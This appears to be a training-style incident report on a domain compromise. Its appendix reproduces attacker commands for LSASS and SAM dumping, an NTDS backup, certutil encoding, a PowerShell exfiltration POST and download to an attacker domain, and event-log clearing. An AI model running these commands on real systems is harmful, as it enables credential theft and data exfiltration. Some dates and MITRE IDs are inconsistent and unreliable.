## Incident Investigation Report
**Date: July 31, 2026**
#
## Incident Information

| Field | Details |
|---------|---------|
| Incident Name | Haldric Domain Compromise & Data Exfiltration |
| Severity | Critical |
| Status | Escalated |
| Analyst | Mohammed Rashad Abdallah |

## Executive Summary

Between 2026-02-19 23:47:12 UTC and 2026-03-04 02:44:59 UTC, an external threat actor successfully compromised the Haldric network. Initial access occurred on 2026-02-20 at 02:14:00 UTC through a successful authentication to the WS-ENG04 workstation using the s.brandt account from IP address 185[.]220[.]101[.]34, following one failed logon attempt on 2026-02-19 at 23:47:12 UTC.

According to AbuseIPDB, the IP address is geolocated to Berlin, State of Berlin, Germany, has an abuse confidence score of 100%, and has been reported 8,493 times. VirusTotal also recorded detections from 15 of 91 security vendors at the time of the investigation. The IP address is associated with The Onion Router (Tor), an anonymity network that routes internet traffic through multiple relays to make users' original IP addresses harder to identify.

Following initial access, the attacker conducted extensive system discovery and Active Directory enumeration on 2026-02-20 at 02:14:30 UTC. On 2026-02-26 at 02:38:48 UTC, the attacker began harvesting credentials from LSASS and the Security Account Manager (SAM).

On 2026-02-28, the attacker moved laterally across the network, accessing the Domain Controller (SRV-DC01) at 03:14:59 UTC and the engineering file server (SRV-FILES02) at 03:16:05 UTC, thereby expanding access to critical network resources.

At 03:17:29 UTC on the same day, the attacker began staging, compressing, and Base64-encoding sensitive avionics data associated with the A400M_NavSys project. At 03:22:59 UTC, the attacker created a backup of the Active Directory database (ntds.dit) using ntdsutil, potentially obtaining access to domain credentials and directory information.

On 2026-02-28 at 03:25:26 UTC, the attacker initiated cleanup activities to conceal their actions and hinder forensic investigation. These activities included deleting staged files and clearing the Windows Security event log.

On 2026-03-02 at 01:19:15 UTC, the attacker exfiltrated the staged data to the external domain cdn-telemetry[.]cloud-endpoint[.]net.

The last observed attacker activity occurred on 2026-03-04 at 02:44:59 UTC on the WS-ENG04 workstation. The attacker downloaded a file from cdn-telemetry[.]cloud-endpoint[.]net and saved it as response.txt in C:\Windows\Temp.

## Scope of Investigation

**Time Frame:**
- Start Time: 2026-02-19 23:47:12 UTC
- End Time: 2026-03-04 02:44:59 UTC

**Affected Assets:**

**Hostnames:**
- WS-ENG04
- SRV-DC01
- SRV-FILES02

**User Accounts:**
- s.brandt
- m.richter

## The 5 Ws and How

**WHO**

The IP addresses 185[.]220[.]101[.]34, 45[.]153[.]160[.]88, and 91[.]234[.]33[.]126 using accounts s.brandt and m.richter.

**WHERE**

- WS-ENG04
- SRV-DC01
- SRV-FILES02

**HOW**

Compromised account, dumped credentials, and moved laterally via SMB/WMI

**WHAT**

Domain compromise and exfiltration of A400M Avionics data

**WHEN**
- Start Time: 2026-02-19 23:47:12 UTC
- End Time: 2026-03-04 02:44:59 UTC

**WHY**

To steal sensitive engineering intellectual property and potentially prepare for a ransomware attack

## Incident Timeline

**Initial Access**

**2026-02-19 23:47:12 UTC**

Failed VPN login attempt using the account s.brandt from IP address 185.220.101.34 targeting workstation WS-ENG04. **(See Appendix B, Section 26)** 

**2026-02-20 02:14:00 UTC**

Successful VPN login using the account s.brandt from IP address 185.220.101.34. The attacker gained remote access to workstation WS-ENG04. **(See Appendix B, Section 27)**

**026-02-20 02:14:07 UTC**

A secure VPN tunnel was established on workstation WS-ENG04. The attacker was assigned the internal IP address 10.1.96.114 (User: s.brandt).

**Discovery**

**2026-02-20 02:14:30 UTC**

The attacker began examining workstation WS-ENG04 (User: s.brandt) to gather system information. **(See Appendix B, Section 1)**

**2026-02-23 01:46:59 UTC**

On workstation WS-ENG04, the attacker (User: s.brandt) checked the list of Domain Admins (high-privilege accounts). **(See Appendix B, Section 2)**

**2026-02-23 01:47:47 UTC**

On workstation WS-ENG04, the attacker (User: s.brandt) checked the list of Enterprise Admins (highest-privilege accounts in the organization). **(See Appendix B, Section 3)**

**2026-02-23 01:49:35 UTC**

On workstation WS-ENG04, the attacker (User: s.brandt) checked the available hard drives on the computer. **(See Appendix B, Section 4)**

**2026-02-25 03:15:00 UTC**

Another successful VPN login by s.brandt on workstation WS-ENG04, this time from IP address 91[.]234[.]33[.]126. **(See Appendix B, Section 27)**

**Credential Dumping**

**2026-02-26 02:38:48 UTC**

On workstation WS-ENG04, the attacker (User: s.brandt) checked whether a critical Windows process used for authentication was running. **(See Appendix B, Section 5)**

**2026-02-26 02:40:02 UTC**

On workstation WS-ENG04, the attacker (User: s.brandt) created a copy of system memory in order to steal usernames and passwords. **(See Appendix B, Section 6)**

**2026-02-26 02:42:55 UTC**

On workstation WS-ENG04, the attacker (User: s.brandt) searched for saved remote access passwords stored on the computer. **(See Appendix B, Section 7)**

**2026-02-27 12:11:28 UTC**

On workstation WS-ENG04, the attacker (User: s.brandt) listed all saved Windows credentials on the computer. **(See Appendix B, Section 8)**

**2026-02-27 12:20:19 UTC**

On workstation WS-ENG04, the attacker (User: s.brandt) exported a sensitive Windows database that stores local account password information. **(See Appendix B, Section 9)**

**Lateral Movement & Domain Controller Access**

**2026-02-28 03:14:59 UTC**

Using the account m.richter, the attacker accessed the main system drive of the Domain Controller (SRV-DC01). **(See Appendix B, Section 10)**

**2026-02-28 03:15:36 UTC**

The attacker (User: m.richter) successfully connected to the Domain Controller SRV-DC01 and listed running processes. **(See Appendix B, Section 11)**

**2026-02-28 03:16:05 UTC**

Using the account m.richter, the attacker accessed the file server (SRV-FILES02). **(See Appendix B, Section 10)**

**2026-02-28 03:16:52 UTC**

On the Domain Controller SRV-DC01, the attacker (User: m.richter) started creating a full backup of the Active Directory database (this contains all domain user credentials). **(See Appendix B, Section 12 )**

**2026-02-28 03:21:27 UTC**

The Active Directory database backup was completed on the Domain Controller SRV-DC01 (User: m.richter). **(See Appendix B, Section 17)**

**2026-02-28 03:22:59 UTC**

On the Domain Controller SRV-DC01, the attacker (User: m.richter) created a snapshot of the hard drive. **(See Appendix B, Section 18)**

**Data Staging**

**2026-02-28 03:17:29 UTC**

On the File Server SRV-FILES02, the attacker (User: m.richter) located and compressed a sensitive engineering document related to the A400M Navigation System. **(See Appendix B, Section 13)**

**2026-02-28 03:18:59 UTC**

On the File Server SRV-FILES02, the attacker (User: m.richter) compressed the entire A400M_NavSys project folder into a single archive. **(See Appendix B, Section 14)**

**2026-02-28 03:19:36 UTC**

On the File Server SRV-FILES02, the attacker (User: m.richter) converted the archive into a text format to make it easier to transfer secretly. **(See Appendix B, Section 15)**

**2026-02-28 03:20:00 UTC**

The prepared data was copied from the File Server SRV-FILES02 to the Domain Controller SRV-DC01 (User: m.richter). **(See Appendix B, Section 16)**

**Defence Evasion**

**2026-02-28 03:25:26 UTC**

On workstation WS-ENG04, the attacker set up network redirection to hide their activity between systems. **(See Appendix B, Section 19)**

**2026-02-28 03:26:13 UTC**

On the Domain Controller SRV-DC01, additional network redirection was configured. **(See Appendix B, Section 20)**

**2026-02-28 03:39:45 UTC**

On the File Server SRV-FILES02, the attacker (User: m.richter) deleted temporary files used during the attack. **(See Appendix B, Section 21)**

**2026-02-28 03:46:56 UTC**

On the Domain Controller SRV-DC01, the attacker (User: m.richter) deleted the Active Directory backup folder. **(See Appendix B, Section 22)**

**2026-02-28 03:47:31 UTC**

On the Domain Controller SRV-DC01, the attacker (User: m.richter) cleared the Windows Security event logs to hide evidence. **(See Appendix B, Section 23)**

**Data Exfiltration**

**2026-03-02 01:10:00 UTC**

Another successful VPN login by s.brandt on workstation WS-ENG04 from IP address 45[.]153[.]160[.]88. **(See Appendix B, Section 27)**

**2026-03-02 01:19:15 UTC**

The attacker (User: s.brandt) successfully sent the stolen engineering data from SRV-FILES02 to an external website under their control (cdn-telemetry[.]cloud-endpoint[.]net). **(See Appendix B, Section 24)**

**2026-03-04 02:44:59 UTC**

The attacker downloaded a file from the same external website to the WS-ENG04 workstation, saving it as response.txt in C:\Windows\Temp. This was the last observed attacker activity. **(See Appendix B, Section 25)**

## Findings & Technical Analysis

The investigation confirmed:
- Successful logins via compromised VPN accounts
- Credential dumping (LSASS and SAM)
- Lateral movement to the Domain Controller and File Server
- Creation of Active Directory database backup
- Staging and exfiltration of sensitive A400M Avionics data
- Defense evasion through log clearing and file deletion

Impact Assessment
- Confidentiality: High. Sensitive engineering intellectual property (A400M_NavSys) was exfiltrated.
- Integrity: High. Full control over the Domain Controller was obtained.
- Business Impact: Significant risk of intellectual property theft and potential regulatory consequences.

**Threat Intelligence Findings**

According to DomainTools, the domain cloud-endpoint[.]net was created on 2026-01-06.  VirusTotal reported that no security vendors flagged the domain as malicious, and the domain was not listed in AbuseIPDB; it was nevertheless used for data exfiltration during the incident.

The IP addresses 185[.]220[.]101[.]34, 45[.]153[.]160[.]88 and 91[.]234[.]33[.]126, with 185[.]220[.]101[.]34 associated with TOR infrastructure. Both VirusTotal and AbuseIPDB flag 185[.]220[.]101[.]34 and 45[.]153[.]160[.]88 as malicious, while 91[.]234[.]33[.]126 was flagged by VirusTotal and not found in the AbuseIPDB database.

The observed attack techniques, including LSASS credential dumping via comsvcs.dll, NTDS IFM backup creation, Base64 encoding using certutil, and the cleanup of staging files, are consistent with tactics commonly associated with advanced persistent threat (APT) groups. **(See Appendix C)**

## MITRE ATT&CK Mapping

| Time (UTC) | Technique ID | Technique Name |
|---|---|---|
| 2026-02-20 02:14:00 | T1078 | Valid Accounts |
| 2026-02-20 02:14:30 | T1082 | System Information Discovery |
| 2026-02-23 01:46:59 | T1069.002 | Permission Groups Discovery: Domain Groups |
| 2026-02-26 02:40:02 | T1003.001 | OS Credential Dumping: LSASS Memory |
| 2026-02-27 12:20:19 | T1003.002 | OS Credential Dumping: Security Account Manager |
| 2026-02-28 03:14:59 | T1021.002 | Remote Services: SMB/Windows Admin Shares |
| 2026-02-28 03:16:52 | T1003.003 | OS Credential Dumping: NTDS |
| 2026-02-28 03:18:59 | T1560.001 | Detect Archiving via Utility |
| 2026-02-28 03:19:36 | T1132.001 | Data Encoding: Standard Encoding |
| 2026-02-28 03:47:31 | T1685.005 | Disable or Modify Tools: Clear Windows Event Logs |
| 2026-03-02 01:19:15 | T1041 | Exfiltration Over C2 Channel |

## Response Actions Taken

- Reviewed process execution and authentication logs across affected hosts
- Analyzed credential dumping and lateral movement activity
- Identified data staging and exfiltration
- Enriched IOCs through available threat intelligence
- Documented full attack timeline
- The entire network was scoped and the last activity observed was on 2026-03-05 14:28:51 UTC where the attacker performed discovery on host WS-ENG04.
- There was no observed compromise beyond data exfiltration and full domain compromise

## Recommendations

- Immediately disable accounts s.brandt and m.richter
- Isolate WS-ENG04, and if possible SRV-FILES02 
- Reset all privileged and service account credentials
- Block domain cdn-telemetry [.] cloud-endpoint [.] net and IPs 185[.]220[.]101[.]34, 45[.]153[.]160[.]88, and 91[.]234[.]33[.]126
- Remove any unauthorized port proxies
- Conduct domain-wide password reset for privileged accounts
- Implement stricter monitoring for LSASS access, ntdsutil, and certutil -encode
- Enforce MFA on all VPN and remote access accounts
- Review and restrict administrative share access
- If possible, reimage the Domain Controller. Otherwise, reset the krbtgt account password twice to invalidate the previous krbtgt secret and any Kerberos tickets that may still be based on the previous key material to help prevent the attacker from using forged Golden Tickets to maintain domain persistence. 
 
## Conclusion

The investigation confirmed a successful multi-stage intrusion that began with a compromised account and resulted in full domain compromise and the exfiltration of sensitive A400M Avionics data. The attacker demonstrated a high level of operational security by using living-off-the-land binaries, staging data under legitimate-looking filenames, and performing cleanup actions. The last activity observed was on 2026-03-05 14:28:51 UTC, where the attacker performed discovery on host WS-ENG04. Immediate containment and credential rotation are required to prevent further damage.


## Appendix A: Indicators of Compromise (IOCs)

**Domains:**
- cdn-telemetry [.] cloud-endpoint [.] net

**IP Addresses:**
- 185[.]220[.]101[.]34 
- 45[.]153[.]160[.]88 
- 91[.]234[.]33[.]126 
- 10[.]1[.]96[.]114

**User Accounts:**
- s.brandt
- m.richter

**Files:**

- C:\Windows\Temp\sys_diag.dmp
- C:\Windows\Temp\sam.bak
- C:\Windows\Temp\win_update_kb5034.zip
- C:\Windows\Temp\win_update_kb5034.b64
- C:\Windows\Temp\nav_cache.cab
- C:\Windows\Temp\McAfee_Logs\ (NTDS IFM backup)
- C:\Windows\Temp\response.txt

**Commands / Tools:**

- comsvcs.dll MiniDump
- ntdsutil "ac i ntds" ifm
- certutil -encode
- netsh interface portproxy

## Appendix B: Technical Evidence & Screenshots

**Process Execution Details (Parent Process, Process, and Command Line)**

**1. System discovery**

Parent Process: 	
- C:\Windows\System32\cmd.exe

Process: 		
- C:\Windows\System32\systeminfo.exe

Command Line: 	
- systeminfo

**Screenshot:**
<img width="1792" height="132" alt="2026-02-20 02-14-30" src="https://github.com/user-attachments/assets/3f4a493a-3726-4687-baa4-3abd6cc9a405" />


**2. Domain Admins enumeration**

Parent Process: 	
- C:\Windows\System32\cmd.exe

Process: 		
- net.exe

Command Line: 	
- net group "Domain Admins" /dom

**Screenshot:**
<img width="1781" height="182" alt="2026-02-23 01 46 59" src="https://github.com/user-attachments/assets/b3e897ab-6ba0-4dfb-b80a-286af06db608" />


**3. Enterprise Admins enumeration**

Parent Process: 	
- C:\Windows\System32\cmd.exe

Process:		
- C:\Windows\System32\net.exe

Command Line: 	
- net group "Enterprise Admins" /dom

**Screenshot:**
<img width="1781" height="230" alt="2026-02-23 01 47 47" src="https://github.com/user-attachments/assets/0f0c0227-0e7b-486b-8730-c65fba4eac64" />

**4. Logical drives query**

Parent Process: 	
- C:\Windows\System32\cmd.exe

Process:		 
- C:\Windows\System32\wbem\WMIC.exe

Command Line: 	
- wmic logicaldisk get caption, filesystem,freespace, size,volumename

**Screenshot:**
<img width="1791" height="233" alt="2026-02-23 01 49 35 227" src="https://github.com/user-attachments/assets/802d6320-9988-46e0-912f-db80fa283160" />

**5. Checked for LSASS process**

Parent Process: 	
- C:\Windows\System32\cmd.exe

Process: 		
- C:\Windows\System32\tasklist.exe

Command Line: 	
- tasklist /fi "imagename eq lsass.exe"

**Screenshot:**
<img width="1796" height="182" alt="2026-02-26 02 38 48 811" src="https://github.com/user-attachments/assets/1907a0e9-b725-4cfd-841e-8b6d7e55a52e" />

**6. LSASS memory dump**

Parent Process:	
- C:\Windows\System32\cmd.exe

Process: 		
- C:\Windows\System32\rundll32.exe

Command Line: 	
- rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 628 C:\Windows\Temp\sys_diag.dmp full

**Screenshot:**
<img width="1792" height="256" alt="2026-02-26 02 40 02 811" src="https://github.com/user-attachments/assets/3d30d36f-07c9-4d3b-877e-376111d49aa2" />

**7. Queried PuTTY sessions**

Parent Process: 	
- C:\Windows\System32\cmd.exe

Process: 		
- C:\Windows\System32\reg.exe

Command Line: 	
- reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

**Screenshot:**
<img width="1793" height="228" alt="2026-02-26 02 42 55 044 " src="https://github.com/user-attachments/assets/1f812e5e-424b-4787-bd7c-6245dc52ed87" />

**8. Listed stored credentials**

Parent Process: 	
- C:\Windows\System32\cmd.exe

Process: 		
- C:\Windows\System32\cmdkey.exe 

Command Line: 	
- cmdkey /list

**Screenshot:**
<img width="1787" height="182" alt="2026-02-27 12 11 28 547" src="https://github.com/user-attachments/assets/04390440-b390-4f81-9f89-bffc45e0d6bb" />

**9. SAM hive dump**

Parent Process: 	
- C:\Windows\System32\cmd.exe

Process: 		
- C:\Windows\System32\reg.exe

Command Line: 	
- reg save HKLM\SAM C:\Windows\Temp\sam.bak

**Screenshot:**
<img width="1792" height="231" alt="2026-02-27 12 20 19" src="https://github.com/user-attachments/assets/f7be3b75-75c4-4e4e-9e78-088c2eaf148d" />

**10. Mapped administrative share**

Parent Process: 	
- C:\Windows\System32\cmd.exe

Process: 		
- C:\Windows\System32\net.exe

Command Line: 	
- net use \SRV-DC01\C$ /user:m.richter Haldric2025SecIT
- net  use \\SRV-FILES02\C$ /user:m.richter Haldric2025SecIT

**Screenshot:**
<img width="1785" height="230" alt="2026-02-28 03 14 59" src="https://github.com/user-attachments/assets/176e6030-0f24-4001-be42-3eb9c09faef6" />

<img width="2410" height="212" alt="Screen Shot 2026-11-04 at 2 32 11 PM" src="https://github.com/user-attachments/assets/82bde6ad-d74a-4646-bee5-c5a5cbcf7285" />

**11. Remote process listing**

Parent Process: 	
- C:\Windows\System32\cmd.exe

Process: 		
- C:\Windows\System32\wbem\WMIC.exe

Command Line:	
- wmic /node:"SRV-DC01" /user:"m.richter" /password:"Haldric2025SecIT" process list brief

**Screenshot:**
<img width="1790" height="252" alt="2026-02-28 03 15 36" src="https://github.com/user-attachments/assets/ab98d0a9-bdc8-4fb7-b34f-fc0269823d72" />

**12. Initiated NTDS IFM backup**

Parent Process:
- C:\Windows\System32\cmd.exe

Process: 
- C:\Windows\System32\wbem\WMIC.exe

Command Line:
- wmic /node:"SRV-DC01" /user:"m.richter" /password:"Haldric2025SecIT" process call create "cmd.exe /c mkdir C:\Windows\Temp\McAfee_Logs & ntdsutil "ac i ntds" ifm "create full C:\Windows\Temp\McAfee_Logs""

**Screenshot:**
<img width="1790" height="312" alt="2026-02-28 03 16 52" src="https://github.com/user-attachments/assets/86f3b5f9-6aa1-4e5a-9ece-3c61da14f99c" />

**13. Compressed sensitive document**

Parent Process: 
- C:\Windows\System32\cmd.exe

Process: 
- C:\Windows\System32\makecab.exe

Command Line: 
- makecab C:\Engineering\Avionics\A400M_NavSys\nav_integration_spec_v4.2.docx C:\Windows\Temp\nav_cache.cab

**Screenshot:**
<img width="1797" height="257" alt="2026-02-28 03 17 29" src="https://github.com/user-attachments/assets/54850e1d-8551-4ccb-80bc-e438461a644e" />

**14. Archived A400M_NavSys directory**

Parent Process: 
- C:\Windows\System32\cmd.exe

Process: 
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Command Line:
- powershell Compress-Archive -Path 'C:\Engineering\Avionics\A400M_NavSys*' -DestinationPath 'C:\Windows\Temp\win_update_kb5034.zip' -Force

**Screenshot:**
<img width="1795" height="302" alt="2026-02-28 03 18 59" src="https://github.com/user-attachments/assets/5ae0d2bf-fdf5-4afa-bcdf-a2ce88083d1d" />

**15. Base64 encoded the archive**

Parent Process: 
- C:\Windows\System32\cmd.exe

Process: 
- C:\Windows\System32\certutil.exe

Command Line: 
- certutil -encode C:\Windows\Temp\win_update_kb5034.zip C:\Windows\Temp\win_update_kb5034.b64

**Screenshot:**
<img width="1786" height="256" alt="2026-02-28 03 19 36" src="https://github.com/user-attachments/assets/21bbb9cb-545d-4f9a-a422-7940e16be795" />

**16. Copied Base64 file**

Parent Process: 
- C:\Windows\System32\cmd.exe

Process: 
- C:\Windows\System32\cmd.exe

Command Line: 
- cmd.exe /c copy \SRV-FILES02\C$\Windows\Temp\win_update_kb5034.b64 C:\Windows\Temp\win_update_kb5034.b64

**Screenshot:**
<img width="1792" height="252" alt="2026-02-28 03 20 00" src="https://github.com/user-attachments/assets/a6e5ae3d-aa90-4941-8ebb-338cc9db14df" />

**17. Completed NTDS IFM backup**

Parent Process: 
- C:\Windows\System32\cmd.exe

Process: 
- C:\Windows\System32\ntdsutil.exe

Command Line: 
- ntdsutil "ac i ntds" ifm "create full C:\Windows\Temp\McAfee_Logs" q q

**Screenshot:**
<img width="1792" height="232" alt="2026-02-28 03 21 27" src="https://github.com/user-attachments/assets/d982eea3-9c18-43e5-81cf-a2f5544942c7" />

**18. Created Volume Shadow Copy**

Parent Process: 
- C:\Windows\System32\cmd.exe

Process: 
- C:\Windows\System32\vssadmin.exe

Command Line:
- vssadmin create shadow /for=C:

**Screenshot:**
<img width="1791" height="182" alt="2026-02-28 03 22 59" src="https://github.com/user-attachments/assets/0eafeddd-8bc0-4bf1-9d68-2f825d3752c5" />

**19. Created port proxy**

Parent Process: 
- C:\Windows\System32\cmd.exe

Process: 
- C:\Windows\System32\netsh.exe

Command Line: 
- netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local

**Screenshot:**
<img width="1792" height="273" alt="2026-02-28 03 25 26" src="https://github.com/user-attachments/assets/dc4ff84c-6af4-4b3d-b2a0-dc8592f6f730" />

**20. Created port proxy**

Parent Process:
- C:\Windows\System32\cmd.exe

Process: 
- C:\Windows\System32\netsh.exe

Command Line: 
- netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp

**Screenshot:**
<img width="1797" height="277" alt="2026-02-28 03 26 13" src="https://github.com/user-attachments/assets/c255dac7-0835-4b1d-9ad5-1650bc12f4f8" />

**21. Deleted staging files**

Parent Process: 
- C:\Windows\System32\cmd.exe

Process: 
- C:\Windows\System32\wbem\WMIC.exe

Command Line: 
- wmic /node:"SRV-FILES02" /user:"m.richter" /password:"Haldric2025SecIT" process call create "cmd.exe /c del /f /q C:\Windows\Temp\nav_cache.cab C:\Windows\Temp\win_update_kb5034.zip C:\Windows\Temp\win_update_kb5034.b64"

**Screenshot:**
<img width="1792" height="336" alt="2026-02-28 03 39 45 470" src="https://github.com/user-attachments/assets/37d6df0f-2de9-4b08-b54c-9f4357c75a95" />

**22. Deleted McAfee_Logs directory**

Parent Process: 
- C:\Windows\System32\cmd.exe

Process: 
- C:\Windows\System32\wbem\WMIC.exe

Command Line: 
- wmic /node:"SRV-DC01" /user:"m.richter" /password:"Haldric2025SecIT" process call create "cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs"

**Screenshot:**
<img width="1788" height="277" alt="2026-02-28 03 46 56" src="https://github.com/user-attachments/assets/cf33d13b-9b39-4f5b-8108-1ba70306370e" />

**23. Cleared Security Event Log**

Parent Process: 
- C:\Windows\System32\cmd.exe

Process: 
- C:\Windows\System32\wbem\WMIC.exe

Command Line: 
- wmic /node:"SRV-DC01" /user:"m.richter" /password:"Haldric2025SecIT" process call create "cmd.exe /c wevtutil cl Security"

**Screenshot:**
<img width="1788" height="256" alt="2026-02-28 03 47 31" src="https://github.com/user-attachments/assets/5091ed2d-53fa-4c69-a08d-7b23382a5e82" />

**24. Data exfiltration**

Parent Process: 
- C:\Windows\System32\cmd.exe

Process: 
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Command Line: 
- powershell Invoke-WebRequest -Uri "https://cdn-telemetry[.]cloud-endpoint[.]net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing

**Screenshot:**
<img width="1792" height="307" alt="2026-03-02 01 19 15" src="https://github.com/user-attachments/assets/fa12d2d8-c54f-499b-9261-b2e9e722e8fe" />

**25. Downloaded response file**

Parent Process: 
- C:\Windows\System32\cmd.exe

Process: 
- C:\Windows\System32\certutil.exe

Command Line: 
- certutil -urlcache -split -f "https://cdn-telemetry[.]cloud-endpoint[.]net" C:\Windows\Temp\response.txt

**Screenshot:**
<img width="1792" height="255" alt="2026-03-04 02 44 59" src="https://github.com/user-attachments/assets/2666ea86-4536-4b4a-b3c2-0f0ac1e0c97f" />

**26. SSL VPN failed logins**

**Screenshot:**
<img width="1790" height="180" alt="SSL VPN login failed - invalid credentials" src="https://github.com/user-attachments/assets/6cc83fcc-f58a-47cc-8e45-a497feaf243d" />

**27. SSL VPN successful logins**

**Screenshot:**
<img width="1793" height="423" alt="remip logins" src="https://github.com/user-attachments/assets/0135016b-eff6-4925-9ad5-ab86360790df" />


## Appendix C: Threat Intelligence Findings Screenshots

**Screenshots:**
<img width="1500" height="805" alt="Domain tools" src="https://github.com/user-attachments/assets/243253b6-f550-4b34-9b92-4bed24a8880f" />
<img width="1907" height="855" alt="VirusTotal 185 220 101 34" src="https://github.com/user-attachments/assets/8b82d0bb-e925-4878-974b-c4422cf39e2e" />
<img width="1665" height="650" alt="AbuseDB 185 220 101 34" src="https://github.com/user-attachments/assets/09b77f68-7479-4a27-958c-75f1b3070170" />
<img width="1671" height="760" alt="45 153 160 88" src="https://github.com/user-attachments/assets/a5ce7210-f84a-4d69-bac3-a2b156a0fba0" />
<img width="1681" height="718" alt="91 234 33 126" src="https://github.com/user-attachments/assets/12e020e5-beca-47a7-aeae-37e3ac9da876" />






















































